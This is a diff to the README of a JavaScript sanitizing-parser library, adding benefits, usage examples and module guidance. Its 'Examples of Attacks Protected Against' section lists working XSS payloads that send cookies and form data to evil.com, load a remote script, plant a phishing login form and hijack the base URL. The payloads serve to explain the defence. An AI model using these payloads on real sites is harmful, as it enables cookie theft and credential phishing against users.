@@ -28,18 +28,28 @@ A collection of secure & minimal parsers for HTML, CSS, SVG, MathML, XML, and JS
 - [Contributing](./.github/CONTRIBUTING.md)
 <!-- - [Security Policy](./.github/SECURITY.md) -->
 
+## Benefits
+
+- **Lightweight**: (6.4Kb gzipped): Keeps your bundle size small and load times down
+- [**Convenient**](#a-quick-example): Easily compose elements, styles, & icons using tagged template literals
+- [**XSS Protection**](#examples-of-attacks-protected-against): Built-in sanitization mitigates XSS vulnerabilities
+- [**Reusable Components**](#reusable-components-and-styles): Create secure & reusable UI components (or modules) with ease
+- [**No Framework Required**](#no-framework-required): Works even without a client-side framework
+- [**Customizable**](#advanced-usage-with-custom-sanitizer-config): Supports your own custom lists of tags and attributes
+- [**Compatible with Strict CSP & Trusted Types**](#content-security-policy-and-trustedtypespolicy): Does not conflict with other security best practices
+
 ## What is This?
-This is a lightweight (as little as 6.3Kb, minified and gzipped) library for parsing
+This is a lightweight (as little as 6.4Kb, minified and gzipped) library for parsing
 various kinds of content using [tagged template literals](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#tagged_templates).
 
 It makes creating UI components, icons, and stylesheets easy, more secure, and
 reusable. No framework required, though it should be compatible with any
 client-side framework (no SSR - unless a full DOM implementation is provided).
 
-It also sanitizes inputs to protect against XSS attacks, much like DOMPuriy. It
-provides a safer alternative to `innerHTML` and using `<style>`s and protects
-against XSS attacks by removing dangerous elements and attributes, and even
-filtering out dangerous links such as `javascript:` URIs.
+It also sanitizes inputs to protect against [Cross-Site Scripting](https://owasp.org/www-community/attacks/xss/)
+(XSS) attacks, much like DOMPuriy. It provides a safer alternative to `innerHTML` and
+using `<style>`s and protects against XSS attacks by removing dangerous elements
+and attributes, and even filtering out dangerous links such as `javascript:` URIs.
 
 > [!IMPORTANT]
 > While this library, the Sanitizer polyfill, and eventually the Sanitizer API
@@ -47,6 +57,128 @@ filtering out dangerous links such as `javascript:` URIs.
 > the web, it should not be assumed that it makes your site immune.
 
 ## A Quick Example
+
+```js
+import { html, css } from '@aegisjsproject/parsers';
+
+document.querySelector('.container').append(html`
+  <h1>Hello, World!</h1>
+`);
+
+document.adoptedStyleSheets = [css`
+  :root {
+    box-sizing: border-box;
+  }
+`];
+```
+
+> [!WARNING]
+> The Sanitizer API is still being developed, and could change. Until the API
+> is stable, this project will remain pre-v1.0.0
+
+### Examples of Attacks Protected Against
+
+```html
+<!-- Steals cookies on click -->
+<a href="javascript:fetch('https://evil.com/?cookie=' + encodeURIComponent(document.cookie))">Steal Cookie</a>
+
+<!-- Another way of stealing cookies -->
+<button onclick="fetch('https://evil.com/?cookie=' + encodeURIComponent(document.cookie))">Steal Cookie</button>
+
+<!-- Steals data from any submitted form -->
+<script>
+  document.forms.forEach(form => {
+    form.addEventListener('submit', event => {
+      navigator.sendBeacon('https://evil.com/api', new FormData(event.target));
+    }, { passive: true });
+  });
+</script>
+
+<!-- Can execute arbitrary code -->
+<script src="https://evil.com/attack.js"></script>
+
+<!-- Trick users to giving their credentials to an attacker -->
+<form action="https://evil.com/">
+  <input type="email" placeholder="user@example.com" autocomplete="email" required="" />
+  <input type="password" placeholder="*******" autocomplete="current-password" required="" />
+  <button type="submit">Login</button>
+</form>
+
+<!-- Change where a form is submitted -->
+<button type="submit" formaction="https://evil.com" form="login">Submit</button>
+
+<!-- Changes the base for interpreting all URLs, including scripts and images -->
+<base href="https://evil.com/" />
+<script src="main.js"></script> <!-- Now points to "https://evil.com/main.js" -->
+
+<!-- Executes an attack when an image loads (or errors when loading) -->
+<img src="https://cdn.images.com/cat.jpg" onload="fetch('https://evil.com/?cookie=' + encodeURIComponent(document.cookie))" />
+```
+
+## No Framework Required
+Everything you need is included in `bundle.min.js`. That includes the polyfill
+for the Sanitizer API and exports everything you need. You can use this in nearly
+any website, directly from your console (using `import()`), in CodePen, etc.
+
+Compatibility with any client-side framework you are already using depends on
+how that framework deals with `DocumentFragment`s and `Element`s as DOM objects.
+Any that can render a native DOM Node should work without any struggle. For any
+that do not, perhaps some simple wrapper could be used.
+
+## Overview of the Parsers
+
+### `html` Tagged Template
+This uses the Sanitizer API with a sanitizer config allowing HTML & SVG by default.
+It returns a [`DocumentFragment`](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment),
+allowing for parsing of multiple elements without requiring a container element
+to wrap everything.
+
+It will strip out dangerous elements such as `<script>`, attributes such as `onclick`,
+and will also remove any `javascript:` or `file:` URI attributes for certain link-type
+attributes such as `href`.
+
+### `css` Tagged Template
+This uses [Constructable StyleSheets](https://web.dev/articles/constructable-stylesheets)
+and returns a [`CSSStyleSheet`](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleSheet),
+which may be used via `documentOrShadow.adoptedStyleSheets`.
+
+> [!WARNING]
+> Constructable StyleSheets are not fully compatible with [CSS Custom Properties](https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties).
+> You may use any that are set elsewhere, but you cannot set new ones.
+
+```css
+/* Works */
+
+.foo {
+  color: var(--my-color, red);
+}
+
+/* Does not work */
+
+.foo {
+  --my-color: red;
+}
+```
+
+### `svg` Tagged Template
+This uses `Document.parseHTML()` with a sanitizer config allowing SVG elements
+and attributes, using the correct namespaces. It returns an [`SVGSVGElement`](https://developer.mozilla.org/en-US/docs/Web/API/SVGSVGElement).
+
+### `math` Tagged Template
+This uses `Document.parseHTML()` with a sanitizer config allowing MathML elements
+and attributes, using the correct namespaces. It returns an [`MathMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/MathMLElement).
+
+### `xml` Tagged Template
+This is just a simple wrapper function using `new DOMParser().parseFromString(str, { type: 'application/xml' })`.
+It does not provide any additional security, only a more convenient way of parsing XML.
+
+### `json` Tagged Template
+This is also just a convenient wrapper that provides no security benefits. It
+just calls `JSON.parse()`.
+
+## Reusable Components and Styles
+Write once and use anywhere! You can event put them in a module script and `export`
+components, styles, and icons.
 
 ```js
 import { html, css, svg } from '@aegisjsproject/parsers';
@@ -69,44 +201,46 @@ export const popover = html`<div id="popover" popover="auto">
 </div>`;
 ```
 
+> [!TIP]
+> Store your color palette in perhaps a `palette.js` module to make it easier to
+> keep designs consistent.
+
+### Importing from Modules
+
+```js
+import { showBtn, popover } from './template.js';
+import { styles } from './style.js';
+import { btnStyles, darkTheme, lightTheme } from '../shared-styles.js';
+
+customElements.define('my-component', class MyComponent extends HTMLElement {
+  constructor() {
+    super();
+    this.attachShadow({ mode: 'open' });
+    this.shadowRoot.append(someBtn.cloneNode(true), popover.cloneNode(true));
+    this.shadowRoot.adoptedStyleSheets = [styles, btnStyles, darkTheme, lightTheme];
+  }
+});
+```
+### Composing Components via Functions
+Another great use would be creating a function that returns a component that uses
+data from its arguments:
+
+```js
+export const createComment = ({ username, userId, date, body }) => html`
+  <div class="comment">
+    <div class="comment-header">
+      Posted by <a href="/users/${userId}">${username}</a> on <time datetime="${date.toISOString()}">${date.toLocalseString()}</time>
+    </div>
+    <div class="comment-body">${body}</div>
+  </div>
+`;
+```
+
 > [!WARNING]
-> The Sanitizer API is still being developed, and could change. Until the API
-> is stable, this project will remain pre-v1.0.0
+> Although the Sanitizer API does a lot to protect against XSS attacks, it would
+> still be a good idea to create a more restricted parser that only allows for
+> very limited tags and attributes.
 
-## Overview of the Parsers
-
-### `html`
-This uses the Sanitizer API with a sanitizer config allowing HTML & SVG by default.
-It returns a [`DocumentFragment`](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment),
-allowing for parsing of multiple elements without requiring a container element
-to wrap everything.
-
-It will strip out dangerous elements such as `<script>`, attributes such as `onclick`,
-and will also remove any `javascript:` or `file:` URI attributes for certain link-type
-attributes such as `href`.
-
-### `css`
-This uses [Constructable StyleSheets](https://web.dev/articles/constructable-stylesheets)
-and returns a [`CSSStyleSheet`](https://developer.mozilla.org/en-US/docs/Web/API/CSSStyleSheet),
-which may be used via `documentOrShadow.adoptedStyleSheets`.
-
-### `svg`
-This uses `Document.parseHTML()` with a sanitizer config allowing SVG elements
-and attributes, using the correct namespaces. It returns an [`SVGSVGElement`](https://developer.mozilla.org/en-US/docs/Web/API/SVGSVGElement).
-
-### `math`
-This uses `Document.parseHTML()` with a sanitizer config allowing MathML elements
-and attributes, using the correct namespaces. It returns an [`MathMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/MathMLElement).
-
-## `xml`
-This is just a simple wrapper function using `new DOMParser().parseFromString(str, { type: 'application/xml' })`.
-It does not provide any additional security, only a more convenient way of parsing XML.
-
-## `json`
-This is also just a convenient wrapper that provides no security benefits. It
-just calls `JSON.parse()`.
-
-- - -
 > [!TIP]
 > Reusing Parsed HTML, SVG, & MathML
 
@@ -127,6 +261,9 @@ well as to allow loading any different polyfill should you choose.
 
 When not using the bundle, it is best to import the polyfill as a separate `<script>`:
 
+> [!IMPORTANT]
+> Be sure to load the polyfill *before* any script using the parsers.
+
 ```html
 <!-- Note: The version and `integrity` are not necessarily current -->
 <script referrerpolicy="no-referrer" crossorigin="anonymous" integrity="sha384-OUI/F1tbQMDz0u/Yf2w+15JU5U5sQzji2Do4pFQIBI7Zc5B5j0LnOoOjA4HpBCwp" src="https://unpkg.com/@aegisjsproject/sanitizer@0.0.7/polyfill.min.js" fetchpriority="high" defer=""></script>
@@ -146,12 +283,14 @@ require('@aegisjsproject/sanitizer/polyfill');
 ```
 
 ## Use as ES Module with [importmap](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap)
-Please be aware that `<script type="importmap">` falls under `script-src` in
-[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
-As such, if you use CSP and do not allow `'unsafe-inline'`, you will need to add
-a `nonce="examplerandomstring"` on it and add `'nonce-examplerandomstring'` to `script-src`.
-Or, you could use a hash/`integrity`/SRI, but be aware that it will be invalid if
-a single character changes.
+
+> [!IMPORTANT]
+> Please be aware that `<script type="importmap">` falls under `script-src` in
+> [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
+> As such, if you use CSP and do not allow `'unsafe-inline'`, you will need to add
+> a `nonce="examplerandomstring"` on it and add `'nonce-examplerandomstring'` to `script-src`.
+> Or, you could use a hash/`integrity`/SRI, but be aware that it will be invalid if
+> a single character changes.
 
 ```html
 <script type="importmap">
@@ -164,28 +303,6 @@ a single character changes.
     }
   }
 </script>
-```
-
-## Basic Usage
-```js
-import { html, css, svg } from '@aegisjsproject/parsers';
-
-const icon = svg`<svg viewBox="0 0 10 10" height="18" width="18" class="icon" fill="currentColor">
-  <rect x="0" y="0" height="10" width="10" rx="1" ry="1" />
-</svg>`
-
-const styles = css`
-  .foo {
-    color: red;
-  }
-`;
-
-const template = html`<div class="container" data-foo="bar">
-  <h1>Hello, World!</h1>
-</div>`;
-
-document.body.append(template, icon);
-document.adoptedStyleSheets = [styles];
 ```
 
 ## Importing Only What is Necessary (ES Modules Only)
